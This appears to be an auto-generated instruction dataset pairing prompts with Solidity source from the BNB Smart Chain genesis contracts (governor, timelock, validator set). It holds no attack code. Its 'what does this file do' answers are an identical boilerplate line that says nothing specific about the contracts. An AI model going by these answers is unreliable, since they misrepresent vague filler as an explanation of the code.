@notice module:core\n     * @dev Timepoint at which votes close. If using block number, votes close at the end of this block, so it is\n     * possible to cast a vote during this block.\n     */\n    function proposalDeadline(\n        uint256 proposalId\n    )\n        public\n        view\n        override(IGovernorUpgradeable, GovernorUpgradeable, GovernorPreventLateQuorumUpgradeable)\n        returns (uint256)\n    {\n        return GovernorPreventLateQuorumUpgradeable.proposalDeadline(proposalId);\n    }\n\n    /*----------------- internal functions -----------------*/\n    function _checkAndStartPropose() internal {\n        if (!proposeStarted) {\n            if (IGovToken(GOV_TOKEN_ADDR).totalSupply() < PROPOSE_START_GOVBNB_SUPPLY_THRESHOLD) {\n                revert TotalSupplyNotEnough();\n            }\n            proposeStarted = true;\n        }\n    }\n\n    function _execute(\n        uint256 proposalId,\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    ) internal override(GovernorUpgradeable, GovernorTimelockControlUpgradeable) whenNotPaused notInBlackList {\n        for (uint256 i = 0; i < targets.length; i++) {\n            if (!whitelistTargets[targets[i]]) revert NotWhitelisted();\n        }\n\n        GovernorTimelockControlUpgradeable._execute(proposalId, targets, values, calldatas, descriptionHash);\n    }\n\n    function _cancel(\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        bytes32 descriptionHash\n    ) internal override(GovernorUpgradeable, GovernorTimelockControlUpgradeable) returns (uint256) {\n        return GovernorTimelockControlUpgradeable._cancel(targets, values, calldatas, descriptionHash);\n    }\n\n    function _castVote(\n        uint256 proposalId,\n        address account,\n        uint8 support,\n        string memory reason,\n        bytes memory params\n    )\n        internal\n        override(GovernorUpgradeable, GovernorPreventLateQuorumUpgradeable)\n        whenNotPaused\n        notInBlackList\n        returns (uint256)\n    {\n        return GovernorPreventLateQuorumUpgradeable._castVote(proposalId, account, support, reason, params);\n    }\n\n    function _executor()\n        internal\n        view\n        override(GovernorUpgradeable, GovernorTimelockControlUpgradeable)\n        returns (address)\n    {\n        return GovernorTimelockControlUpgradeable._executor();\n    }\n}\n\n```"}
{"instruction": "What does the file BSCGovernor.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorSettingsUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/GovernorUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/compatibility/GovernorCompatibilityBravoUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorVotesUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorTimelockControlUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorVotesQuorumFractionUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/governance/extensions/GovernorPreventLateQuorumUpgradeable.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./extension/Protectable.sol\";\nimport \"./lib/0.8.x/Utils.sol\";\nimport \"./interface/0.8.x/IGovToken.sol\";\n\ncontract BSCGovernor is\n    SystemV2,\n    Initializable,\n    Protectable,\n    GovernorUpgradeable,\n    GovernorSettingsUpgradeable,\n    GovernorCompatibilityBravoUpgradeable,\n    GovernorVotesUpgradeable,\n    GovernorTimelockControlUpgradeable,\n    GovernorVotesQuorumFractionUpgradeable,\n    GovernorPreventLateQuorumUpgradeable\n{\n    using Utils for bytes;\n    using Utils for string;\n\n    /*----------------- constants -----------------*/\n    /**\n     * @dev caution:\n     * INIT_VOTING_DELAY, INIT_VOTING_PERIOD and INIT_MIN_PERIOD_AFTER_QUORUM are default in number of blocks, not seconds\n     */\n    uint256 private constant BLOCK_INTERVAL = 3 seconds; // TODO(Nathan): Only can be used to do initialize!\n    uint256 private constant INIT_VOTING_DELAY = 0 hours / BLOCK_INTERVAL;\n    uint256 private constant INIT_VOTING_PERIOD = 7 days / BLOCK_INTERVAL;\n    uint256 private constant INIT_PROPOSAL_THRESHOLD = 200 ether; //  = 200 BNB\n    uint256 private constant INIT_QUORUM_NUMERATOR = 10; // for >= 10%\n\n    // starting propose requires totalSupply of GovBNB >= 10\n```", "output": "This file `BSCGovernor.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for BSCTimelock.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\BSCTimelock.sol`:\n\n```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/governance/TimelockControllerUpgradeable.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./lib/0.8.x/Utils.sol\";\n\ncontract BSCTimelock is SystemV2, Initializable, TimelockControllerUpgradeable {\n    using Utils for bytes;\n    using Utils for string;\n\n    /*----------------- constants -----------------*/\n    /*\n     * @dev caution: minDelay using second as unit\n     */\n    uint256 private constant INIT_MINIMAL_DELAY = 24 hours;\n\n    /*----------------- init -----------------*/\n    function initialize() external initializer onlyCoinbase onlyZeroGasPrice {\n        address[] memory _governor = new address[](1);\n        _governor[0] = GOVERNOR_ADDR;\n        __TimelockController_init(INIT_MINIMAL_DELAY, _governor, _governor, GOVERNOR_ADDR);\n    }\n\n    /*----------------- system functions -----------------*/\n    /**\n     * @param key the key of the param\n     * @param value the value of the param\n     */\n    function updateParam(string calldata key, bytes calldata value) external onlyGov {\n        if (key.compareStrings(\"minDelay\")) {\n            if (value.length != 32) revert InvalidValue(key, value);\n            uint256 newMinDelay = value.bytesToUint256(32);\n            if (newMinDelay == 0 || newMinDelay > 14 days) revert InvalidValue(key, value);\n            this.updateDelay(newMinDelay);\n        } else {\n            revert UnknownParam(key, value);\n        }\n        emit ParamChange(key, value);\n    }\n}\n\n```"}
{"instruction": "What does the file BSCTimelock.sol do?", "input": "```sol\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts-upgradeable/governance/TimelockControllerUpgradeable.sol\";\n\nimport \"./SystemV2.sol\";\nimport \"./lib/0.8.x/Utils.sol\";\n\ncontract BSCTimelock is SystemV2, Initializable, TimelockControllerUpgradeable {\n    using Utils for bytes;\n    using Utils for string;\n\n    /*----------------- constants -----------------*/\n    /*\n     * @dev caution: minDelay using second as unit\n     */\n    uint256 private constant INIT_MINIMAL_DELAY = 24 hours;\n\n    /*----------------- init -----------------*/\n    function initialize() external initializer onlyCoinbase onlyZeroGasPrice {\n        address[] memory _governor = new address[](1);\n        _governor[0] = GOVERNOR_ADDR;\n        __TimelockController_init(INIT_MINIMAL_DELAY, _governor, _governor, GOVERNOR_ADDR);\n    }\n\n    /*----------------- system functions -----------------*/\n    /**\n     * @param key the key of the param\n     * @param value the value of the param\n     */\n    function updateParam(string calldata key, bytes calldata value) external onlyGov {\n        if (key.compareStrings(\"minDelay\")) {\n            if (value.length != 32) revert InvalidValue(key, value);\n            uint256 newMinDelay = value.bytesToUint256(32);\n            if (newMinDelay == 0 || newMinDelay > 14 days) revert InvalidValue(key, value);\n            this.updateDelay(newMinDelay);\n        } else {\n            revert UnknownParam(key, value);\n        }\n        emit ParamChange(key, value);\n    }\n}\n\n```", "output": "This file `BSCTimelock.sol` is part of the contracts project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for BSCValidatorSet.sol which is part of the contracts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\contracts\\BSCValidatorSet.sol`:\n\n```sol\npragma solidity 0.6.4;\npragma experimental ABIEncoderV2;\n\nimport \"./System.sol\";\nimport \"./lib/0.6.x/BytesLib.sol\";\nimport \"./lib/0.6.x/BytesToTypes.sol\";\nimport \"./lib/0.6.x/Memory.sol\";\nimport \"./interface/0.6.x/ISlashIndicator.sol\";\nimport \"./interface/0.6.x/IParamSubscriber.sol\";\nimport \"./interface/0.6.x/IBSCValidatorSet.sol\";\nimport \"./interface/0.6.x/IApplication.sol\";\nimport \"./interface/0.6.x/IStakeHub.sol\";\nimport \"./lib/0.6.x/SafeMath.sol\";\nimport \"./lib/0.6.x/RLPDecode.sol\";\n\ncontract BSCValidatorSet is IBSCValidatorSet, System, IParamSubscriber, IApplication {\n    using SafeMath for uint256;\n\n    using RLPDecode for *;\n\n    bytes public constant INIT_VALIDATORSET_BYTES =\n        hex\"f905ec80f905e8f846942a7cdd959bfe8d9487b2a43b33565295a698f7e294b6a7edd747c0554875d3fc531d19ba1497992c5e941ff80f3f7f110ffd8920a3ac38fdef318fe94a3f86048c27395000f846946488aa4d1955ee33403f8ccb1d4de5fb97c7ade294220f003d8bdfaadf52aa1e55ae4cc485e6794875941a87e90e440a39c99aa9cb5cea0ad6a3f0b2407b86048c27395000f846949ef9f4360c606c7ab4db26b016007d3ad0ab86a0946103af86a874b705854033438383c82575f25bc29418e2db06cbff3e3c5f856410a1838649e760175786048c27395000f84694ee01c3b1283aa067c58eab4709f85e99d46de5fe94ee4b9bfb1871c64e2bcabb1dc382dc8b7c4218a29415904ab26ab0e99d70b51c220ccdcccabee6e29786048c27395000f84694685b1ded8013785d6623cc18d214320b6bb6475994a20ef4e5e4e7e36258dbf51f4d905114cb1b34bc9413e39085dc88704f4394d35209a02b1a9520320c86048c27395000f8469478f3adfc719c99674c072166708589033e2d9afe9448a30d5eaa7b64492a160f139e2da2800ec3834e94055838358c29edf4dcc1ba1985ad58aedbb6be2b86048c27395000f84694c2be4ec20253b8642161bc3f444f53679c1f3d479466f50c616d737e60d7ca6311ff0d9c434197898a94d1d678a2506eeaa365056fe565df8bc8659f28b086048c27395000f846942f7be8361c80a4c1e7e9aaf001d0877f1cfde218945f93992ac37f3e61db2ef8a587a436a161fd210b94ecbc4fb1a97861344dad0867ca3cba2b860411f086048c27395000f84694ce2fd7544e0b2cc94692d4a704debef7bcb613289444abc67b4b2fba283c582387f54c9cba7c34bafa948acc2ab395ded08bb75ce85bf0f95ad2abc51ad586048c27395000f84694b8f7166496996a7da21cf1f1b04d9b3e26a3d077946770572763289aac606e4f327c2f6cc1aa3b3e3b94882d745ed97d4422ca8da1c22ec49d880c4c097286048c27395000f846942d4c407bbe49438ed859fe965b140dcf1aab71a9943ad0939e120f33518fbba04631afe7a3ed6327b194b2bbb170ca4e499a2b0f3cc85ebfa6e8c4dfcbea86048c27395000f846946bbad7cf34b5fa511d8e963dbba288b1960e75d694853b0f6c324d1f4e76c8266942337ac1b0af1a229442498946a51ca5924552ead6fc2af08b94fcba648601d1a94a2000f846944430b3230294d12c6ab2aac5c2cd68e80b16b581947b107f4976a252a6939b771202c28e64e03f52d694795811a7f214084116949fc4f53cedbf189eeab28601d1a94a2000f84694ea0a6e3c511bbd10f4519ece37dc24887e11b55d946811ca77acfb221a49393c193f3a22db829fcc8e9464feb7c04830dd9ace164fc5c52b3f5a29e5018a8601d1a94a2000f846947ae2f5b9e386cd1b50a4550696d957cb4900f03a94e83bcc5077e6b873995c24bac871b5ad856047e19464e48d4057a90b233e026c1041e6012ada897fe88601d1a94a2000f8469482012708dafc9e1b880fd083b32182b869be8e09948e5adc73a2d233a1b496ed3115464dd6c7b887509428b383d324bc9a37f4e276190796ba5a8947f5ed8601d1a94a2000f8469422b81f8e175ffde54d797fe11eb03f9e3bf75f1d94a1c3ef7ca38d8ba80cce3bfc53ebd2903ed21658942767f7447f7b9b70313d4147b795414aecea54718601d1a94a2000f8469468bf0b8b6fb4e317a0f9d6f03eaf8ce6675bc60d94675cfe570b7902623f47e7f59c9664b5f5065dcf94d84f0d2e50bcf00f2fc476e1c57f5ca2d57f625b8601d1a94a2000f846948c4d90829ce8f72d0163c1d5cf348a862d5506309485c42a7b34309bee2ed6a235f86d16f059deec5894cc2cedc53f0fa6d376336efb67e43d167169f3b78601d1a94a2000f8469435e7a025f4da968de7e4d7e4004197917f4070f194b1182abaeeb3b4d8eba7e6a4162eac7ace23d57394c4fd0d870da52e73de2dd8ded19fe3d26f43a1138601d1a94a2000f84694d6caa02bbebaebb5d7e581e4b66559e635f805ff94c07335cf083c1c46a487f0325769d88e163b653694efaff03b42e41f953a925fc43720e45fb61a19938601d1a94a2000\";\n\n    uint256 public constant INIT_NUM_OF_CABINETS = 21;\n\n    /*----------------- state of the contract -----------------*/\n    Validator[] public currentValidatorSet;\n    uint256 public expireTimeSecondGap;  // @dev deprecated\n    uint256 public totalInComing;\n\n    // key is the `consensusAddress` of `Validator`,\n    // value is the index of the element in `currentValidatorSet`.\n    mapping(address => uint256) public currentValidatorSetMap;\n    uint256 public numOfJailed; // @dev deprecated\n\n    uint256 public constant BLOCK_FEES_RATIO_SCALE = 10000;\n    address public constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;\n    uint256 public constant INIT_BURN_RATIO = 1000;\n    uint256 public burnRatio;\n    bool public burnRatioInitialized; // @dev deprecated\n\n    // BEP-127 Temporary Maintenance\n    uint256 public constant INIT_MAX_NUM_OF_MAINTAINING = 3;\n    uint256 public constant INIT_MAINTAIN_SLASH_SCALE = 2;\n\n    uint256 public maxNumOfMaintaining;\n    uint256 public numOfMaintaining;\n    uint256 public maintainSlashScale;\n\n    // Corresponds strictly to currentValidatorSet\n    // validatorExtraSet[index] = the `ValidatorExtra` info of currentValidatorSet[index]\n    ValidatorExtra[] public validatorExtraSet;\n    // BEP-131 candidate validator\n    uint256 public numOfCabinets;\n    uint256 public maxNumOfCandidates;\n    uint256 public maxNumOfWorkingCandidates;\n\n    // BEP-126 Fast Finality\n    uint256 public constant INIT_SYSTEM_REWARD_RATIO = 625; // 625/10000 is 1/16\n    uint256 public constant MAX_SYSTEM_REWARD_BALANCE = 100 ether;\n\n    uint256 public systemRewardBaseRatio;\n    uint256 public previousHeight;\n    uint256 public previousBalanceOfSystemReward; // @dev deprecated\n    bytes[] public previousVoteAddrFullSet;\n    bytes[] public currentVoteAddrFullSet;\n    bool public isSystemRewardIncluded;\n\n    // BEP-294 BC-fusion\n    Validator[] private _tmpMigratedValidatorSet; // @dev deprecated\n    bytes[] private _tmpMigratedVoteAddrs; // @dev deprecated\n\n    // BEP-341 Validators can produce consecutive blocks\n    uint256 public turnLength; // Consecutive number of blocks a validator receives priority for block production\n    uint256 public systemRewardAntiMEVRatio;\n\n    struct Validator {\n        address consensusAddress;\n        address payable feeAddress;\n        address BBCFeeAddress;\n        uint64 votingPower;\n        // only in state\n        bool jailed;\n        uint256 incoming;\n    }\n\n    struct ValidatorExtra {\n        // BEP-127 Temporary Maintenance\n        uint256 enterMaintenanceHeight; // the height from where the validator enters Maintenance\n        bool isMaintaining;\n        // BEP-126 Fast Finality\n        bytes voteAddress;\n        // reserve for future use\n        uint256[19] slots;\n    }\n\n    struct ValidatorSetPackage {\n        uint8 packageType;\n        Validator[] validatorSet;\n        bytes[] voteAddrs;\n    }\n\n    /*----------------- modifiers -----------------*/\n    modifier noEmptyDeposit() {\n        require(msg.value > 0, \"deposit value is zero\");\n        _;\n    }\n\n    modifier initValidatorExtraSet() {\n        if (validatorExtraSet.length == 0) {\n            ValidatorExtra memory validatorExtra;\n            // init validatorExtraSet\n            uint256 validatorsNum = currentValidatorSet.length;\n            for (uint256 i; i < validatorsNum; ++i) {\n                validatorExtraSet.push(validatorExtra);\n            }\n        }\n\n        _;\n    }\n\n    modifier oncePerBlock() {\n        require(block.number > previousHeight, \"can not do this twice in one block\");\n        _;\n        previousHeight = block.number;\n    }\n\n    /*----------------- events -----------------*/\n    event validatorSetUpdated();\n    event systemTransfer(uint256 amount);\n    event deprecatedDeposit(address indexed validator, uint256 amount);\n    event validatorDeposit(address indexed validator, uint256 amount);\n    event validatorMisdemeanor(address indexed validator, uint256 amount);\n    event validatorFelony(address indexed validator, uint256 amount);\n    event paramChange(string key, bytes value);\n    event feeBurned(uint256 amount);\n    event validatorEnterMaintenance(address indexed validator);\n    event validatorExitMaintenance(address indexed validator);\n    event finalityRewardDeposit(address indexed validator, uint256 amount);\n    event deprecatedFinalityRewardDeposit(address indexed validator, uint256 amount);\n\n    event validatorJailed(address indexed validator);  // @dev deprecated\n    event validatorEmptyJailed(address indexed validator);  // @dev deprecated\n    event batchTransfer(uint256 amount);  // @dev deprecated\n    event batchTransferFailed(uint256 indexed amount, string reason);  // @dev deprecated\n    event batchTransferLowerFailed(uint256 indexed amount, bytes reason);  // @dev deprecated\n    event directTransfer(address payable indexed validator, uint256 amount);  // @dev deprecated\n    event directTransferFail(address payable indexed validator, uint256 amount);  // @dev deprecated\n    event failReasonWithStr(string message);  // @dev deprecated\n    event unexpectedPackage(uint8 channelId, bytes msgBytes);  // @dev deprecated\n    event tmpValidatorSetUpdated(uint256 validatorsNum);  // @dev deprecated\n\n    /*----------------- init -----------------*/\n    function init() external onlyNotInit {\n        (ValidatorSetPackage memory validatorSetPkg, bool valid) =\n            decodeValidatorSet(INIT_VALIDATORSET_BYTES);\n        require(valid, \"failed to parse init validatorSet\");\n        for (uint256 i; i < validatorSetPkg.validatorSet.length; ++i) {\n            currentValidatorSet.push(validatorSetPkg.validatorSet[i]);\n            currentValidatorSetMap[validatorSetPkg.validatorSet[i].consensusAddress] = i + 1;\n        }\n        alreadyInit = true;\n    }\n\n    receive() external payable { }\n\n    /*----------------- Cross Chain App Implement -----------------*/\n    function handleSynPackage(\n        uint8,\n        bytes calldata msgBytes\n    ) external override onlyInit onlyCrossChainContract initValidatorExtraSet returns (bytes memory responsePayload) {\n        revert(\"deprecated\");\n    }\n\n    function handleAckPackage(uint8 channelId, bytes calldata msgBytes) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    function handleFailAckPackage(uint8 channelId, bytes calldata msgBytes) external override onlyCrossChainContract {\n        revert(\"deprecated\");\n    }\n\n    /*----------------- External Functions -----------------*/\n    /**\n     * @dev Update validator set method after fusion fork.\n     */\n    function updateValidatorSetV2(\n        address[] memory _consensusAddrs,\n        uint64[] memory _votingPowers,\n        bytes[] memory _voteAddrs\n    ) public onlyCoinbase onlyZeroGasPrice {\n        uint256 _length = _consensusAddrs.length;\n        Validator[] memory _validatorSet = new Validator[](_length);\n        for (uint256 i; i < _length; ++i) {\n            _validatorSet[i] = Validator({\n                consensusAddress: _consensusAddrs[i],\n                feeAddress: payable(address(0)),\n                BBCFeeAddress: address(0),\n                votingPower: _votingPowers[i],\n                jailed: false,\n                incoming: 0\n            });\n        }\n\n        // step 0: force all maintaining validators to exit `Temporary Maintenance`\n        // - 1. validators exit maintenance\n        // - 2. clear all maintainInfo\n        // - 3. get unjailed validators from validatorSet\n        (Validator[] memory validatorSetTemp, bytes[] memory voteAddrsTemp) =\n            _forceMaintainingValidatorsExit(_validatorSet, _voteAddrs);\n\n        // step 1: distribute incoming\n        for (uint256 i; i < currentValidatorSet.length; ++i) {\n            uint256 incoming = currentValidatorSet[i].incoming;\n            if (incoming != 0) {\n                currentValidatorSet[i].incoming = 0;\n                IStakeHub(STAKE_HUB_ADDR).distributeReward{ value: incoming }(currentValidatorSet[i].consensusAddress);\n            }\n        }\n\n        // step 2: do dusk transfer\n        if (address(this).balance > 0) {\n            emit systemTransfer(address(this).balance);\n            address(uint160(SYSTEM_REWARD_ADDR)).transfer(address(this).balance);\n        }\n\n        // step 3: do update validator set state\n        totalInComing = 0;\n        if (validatorSetTemp.length != 0) {\n            doUpdateState(validatorSetTemp, voteAddrsTemp);\n        }\n\n        // step 3: clean slash contract\n        ISlashIndicator(SLASH_CONTRACT_ADDR).clean();\n        emit validatorSetUpdated();\n    }\n\n    /**\n     * @dev Collect all fee of transactions from the current block and deposit it to the contract\n     *\n     * @param valAddr The validator address who produced the current block\n     */\n    function deposit(address valAddr) external payable onlyCoinbase onlyInit noEmptyDeposit onlyZeroGasPrice {\n        uint256 value = msg.value;\n        uint256 index = currentValidatorSetMap[valAddr];\n\n        if (isSystemRewardIncluded == false) {\n            systemRewardBaseRatio = INIT_SYSTEM_REWARD_RATIO;\n            burnRatio = INIT_BURN_RATIO;\n            isSystemRewardIncluded = true;\n        }\n\n        uint256 systemRewardRatio = systemRewardBaseRatio;\n        if (turnLength > 1 && systemRewardAntiMEVRatio > 0) {\n            systemRewardRatio += systemRewardAntiMEVRatio * (block.number % turnLength) / (turnLength - 1);\n        }\n\n        if (value > 0 && systemRewardRatio > 0) {\n            uint256 toSystemReward = msg.value.mul(systemRewardRatio).div(BLOCK_FEES_RATIO_SCALE);\n            if (toSystemReward > 0) {\n                address(uint160(SYSTEM_REWARD_ADDR)).transfer(toSystemReward);\n                emit systemTransfer(toSystemReward);\n\n                value = value.sub(toSystemReward);\n            }\n        }\n\n        if (value > 0 && burnRatio > 0) {\n            uint256 toBurn = msg.value.mul(burnRatio).div(BLOCK_FEES_RATIO_SCALE);\n            if (toBurn > 0) {\n                address(uint160(BURN_ADDRESS)).transfer(toBurn);\n                emit feeBurned(toBurn);\n\n                value = value.sub(toBurn);\n            }\n        }\n\n        if (index > 0) {\n            Validator storage validator = currentValidatorSet[index - 1];\n            if (validator.jailed) {\n                emit deprecatedDeposit(valAddr, value);\n            } else {\n                totalInComing = totalInComing.add(value);\n                validator.incoming = validator.incoming.add(value);\n                emit validatorDeposit(valAddr, value);\n            }\n        } else {\n            // get incoming from deprecated validator;\n            emit deprecatedDeposit(valAddr, value);\n        }\n    }\n\n    function distributeFinalityReward(\n        address[] calldata valAddrs,\n        uint256[] calldata weights\n    ) external onlyCoinbase oncePerBlock onlyZeroGasPrice onlyInit {\n        uint256 totalValue;\n        uint256 balanceOfSystemReward = address(SYSTEM_REWARD_ADDR).balance;\n        if (balanceOfSystemReward > MAX_SYSTEM_REWARD_BALANCE) {\n            // when a slash happens, theres will no rewards in some finalityReward intervals,\n            // it's tolerated because slash happens rarely\n            totalValue = balanceOfSystemReward.sub(MAX_SYSTEM_REWARD_BALANCE);\n        } else {\n            return;\n        }\n\n        totalValue = ISystemReward(SYSTEM_REWARD_ADDR).claimRewards(payable(address(this)), totalValue);\n        if (totalValue == 0) {\n            return;\n        }\n\n        uint256 totalWeight;\n        for (uint256 i; i < weights.length; ++i) {\n            totalWeight += weights[i];\n        }\n        if (totalWeight == 0) {\n            return;\n        }\n\n        uint256 value;\n        address valAddr;\n        uint256 index;\n\n        for (uint256 i; i < valAddrs.length; ++i) {\n            value = (totalValue * weights[i]) / totalWeight;\n            valAddr = valAddrs[i];\n            index = currentValidatorSetMap[valAddr];\n            if (index > 0) {\n                Validator storage validator = currentValidatorSet[index - 1];\n                if (validator.jailed) {\n                    emit deprecatedFinalityRewardDeposit(valAddr, value);\n                } else {\n                    totalInComing = totalInComing.add(value);\n                    validator.incoming = validator.incoming.add(value);\n                    emit finalityRewardDeposit(valAddr, value);\n                }\n            } else {\n                // get incoming from deprecated validator;\n                emit deprecatedFinalityRewardDeposit(valAddr, value);\n            }\n        }\n    }\n\n    /*----------------- View Functions -----------------*/\n    /**\n     * @notice Return the vote address and consensus address of the validators in `currentValidatorSet` that are not jailed\n     */\n    function getLivingValidators() external view override returns (address[] memory, bytes[] memory) {\n        uint256 n = currentValidatorSet.length;\n        uint256 living;\n        for (uint256 i; i < n; ++i) {\n            if (!currentValidatorSet[i].jailed) {\n                living++;\n            }\n        }\n        address[] memory consensusAddrs = new address[](living);\n        bytes[] memory voteAddrs = new bytes[](living);\n        living = 0;\n        if (validatorExtraSet.length == n) {\n            for (uint256 i; i < n; ++i) {\n                if (!currentValidatorSet[i].jailed) {\n                    consensusAddrs[living] = currentValidatorSet[i].consensusAddress;\n                    voteAddrs[living] = validatorExtraSet[i].voteAddress;\n                    living++;\n                }\n            }\n        } else {\n            for (uint256 i; i < n; ++i) {\n                if (!currentValidatorSet[i].jailed) {\n                    consensusAddrs[living] = currentValidatorSet[i].consensusAddress;\n                    living++;\n                }\n            }\n        }\n        return (consensusAddrs, voteAddrs);\n    }\n\n    /**\n     * @notice Return the vote address and consensus address of mining validators\n     *\n     * Mining validators are block producers in the current epoch\n     * including most of the cabinets and a few of the candidates\n     */\n    function getMiningValidators() external view override returns (address[] memory, bytes[] memory) {\n        uint256 _maxNumOfWorkingCandidates = maxNumOfWorkingCandidates;\n        uint256 _numOfCabinets = numOfCabinets > 0 ? numOfCabinets : INIT_NUM_OF_CABINETS;\n        uint256 _shuffleInterval = 200;\n\n        address[] memory validators = getValidators();\n        bytes[] memory voteAddrs = getVoteAddresses(validators);\n        if (validators.length <= _numOfCabinets) {\n            return (validators, voteAddrs);\n        }\n\n        if ((validators.length - _numOfCabinets) < _maxNumOfWorkingCandidates) {\n            _maxNumOfWorkingCandidates = validators.length - _numOfCabinets;\n        }\n        if (_maxNumOfWorkingCandidates > 0) {\n            uint256 shuffleNumber = block.number / _shuffleInterval;\n            shuffle(\n                validators,\n                voteAddrs,\n                shuffleNumber,\n                _numOfCabinets - _maxNumOfWorkingCandidates,\n                0,\n                _maxNumOfWorkingCandidates,\n                _numOfCabinets\n            );\n            shuffle(\n                validators,\n                voteAddrs,\n                shuffleNumber,\n                _numOfCabinets - _maxNumOfWorkingCandidates,\n                _numOfCabinets - _maxNumOfWorkingCandidates,\n                _maxNumOfWorkingCandidates,\n                validators.length - _numOfCabinets + _maxNumOfWorkingCandidates\n            );\n        }\n        address[] memory miningValidators = new address[](_numOfCabinets);\n        bytes[] memory miningVoteAddrs = new bytes[](_numOfCabinets);\n        for (uint256 i; i < _numOfCabinets; ++i) {\n            miningValidators[i] = validators[i];\n            miningVoteAddrs[i] = voteAddrs[i];\n        }\n        return (miningValidators, miningVoteAddrs);\n    }\n\n    /**\n     * @notice Return the consensus address of the validators in `currentValidatorSet` that are not jailed and not maintaining\n     */\n    function getValidators() public view returns (address[] memory) {\n        uint256 n = currentValidatorSet.length;\n        uint256 valid = 0;\n        for (uint256 i; i < n; ++i) {\n            if (isWorkingValidator(i)) {\n                ++valid;\n            }\n        }\n        address[] memory consensusAddrs = new address[](valid);\n        valid = 0;\n        for (uint256 i; i < n; ++i) {\n            if (isWorkingValidator(i)) {\n                consensusAddrs[valid] = currentValidatorSet[i].consensusAddress;\n                ++valid;\n            }\n        }\n        return consensusAddrs;\n    }\n\n    /**\n     * @notice Return the current incoming of the validator\n     */\n    function getIncoming(address validator) external view returns (uint256) {\n        uint256 index = currentValidatorSetMap[validator];\n        if (index <= 0) {\n            return 0;\n        }\n        return currentValidatorSet[index - 1].incoming;\n    }\n\n    /**\n     * @notice Return whether the validator is a working validator(not jailed or maintaining) by index\n     *\n     * @param index The index of the validator in `currentValidatorSet`(from 0 to `currentValidatorSet.length-1`)\n     */\n    function isWorkingValidator(uint256 index) public view returns (bool) {\n        if (index >= currentValidatorSet.length) {\n            return false;\n        }\n\n        // validatorExtraSet[index] should not be used before it has been init.\n        if (index >= validatorExtraSet.length) {\n            return !currentValidatorSet[index].jailed;\n        }\n\n        return !currentValidatorSet[index].jailed && !validatorExtraSet[index].isMaintaining;\n    }\n\n    /**\n     * @notice Return whether the validator is a working validator(not jailed or maintaining) by consensus address\n     * Will return false if the validator is not in `currentValidatorSet`\n     */\n    function isCurrentValidator(address validator) external view override returns (bool) {\n        uint256 index = currentValidatorSetMap[validator];\n        if (index <= 0) {\n            return false;\n        }\n\n        // the actual index\n        index = index - 1;\n        return isWorkingValidator(index);\n    }\n\n    /**\n     * @notice Return the index of the validator in `currentValidatorSet`(from 0 to `currentValidatorSet.length-1`)\n     */\n    function getCurrentValidatorIndex(address validator) public view returns (uint256) {\n        uint256 index = currentValidatorSetMap[validator];\n        require(index > 0, \"only current validators\");\n\n        // the actual index\n        return index - 1;\n    }\n\n    /**\n     * @notice Return the number of mining validators.\n     * The function name is misleading, it should be `getMiningValidatorCount`. But it's kept for compatibility.\n     */\n    function getWorkingValidatorCount() public view returns (uint256 workingValidatorCount) {\n        workingValidatorCount = getValidators().length;\n        uint256 _numOfCabinets = numOfCabinets > 0 ? numOfCabinets : INIT_NUM_OF_CABINETS;\n        if (workingValidatorCount > _numOfCabinets) {\n            workingValidatorCount = _numOfCabinets;\n        }\n        if (workingValidatorCount == 0) {\n            workingValidatorCount = 1;\n        }\n    }\n\n    /*----------------- For slash -----------------*/\n    function misdemeanor(address validator) external override onlySlash initValidatorExtraSet {\n        uint256 validatorIndex = _misdemeanor(validator);\n        if (canEnterMaintenance(validatorIndex)) {\n            _enterMaintenance(validator, validatorIndex);\n        }\n    }\n\n    function felony(address validator) external override initValidatorExtraSet {\n        require(msg.sender == SLASH_CONTRACT_ADDR || msg.sender == STAKE_HUB_ADDR, \"only slash or stakeHub contract\");\n\n        uint256 index = currentValidatorSetMap[validator];\n        if (index <= 0) {\n            return;\n        }\n        // the actual index\n        index = index - 1;\n\n        bool isMaintaining = validatorExtraSet[index].isMaintaining;\n        if (_felony(validator, index) && isMaintaining) {\n            --numOfMaintaining;\n        }\n    }\n\n    function removeTmpMigratedValidator(address validator) external onlyStakeHub {\n        revert(\"deprecated\");\n    }\n\n    /*----------------- For Temporary Maintenance -----------------*/\n    /**\n     * @notice Return whether the validator at index could enter maintenance\n     */\n    function canEnterMaintenance(uint256 index) public view returns (bool) {\n        if (index >= currentValidatorSet.length) {\n            return false;\n        }\n\n        if (\n            currentValidatorSet[index].consensusAddress == address(0) // - 0. check if empty validator\n                || (maxNumOfMaintaining == 0 || maintainSlashScale == 0) // - 1. check if not start\n                || numOfMaintaining >= maxNumOfMaintaining // - 2. check if reached upper limit\n                || !isWorkingValidator(index) // - 3. check if not working(not jailed and not maintaining)\n                || validatorExtraSet[index].enterMaintenanceHeight > 0 // - 5. check if has Maintained during current 24-hour period\n                    // current validators are selected every 24 hours(from 00:00:00 UTC to 23:59:59 UTC)\n                || getValidators().length <= 1 // - 6. check num of remaining working validators\n        ) {\n            return false;\n        }\n\n        return true;\n    }\n\n    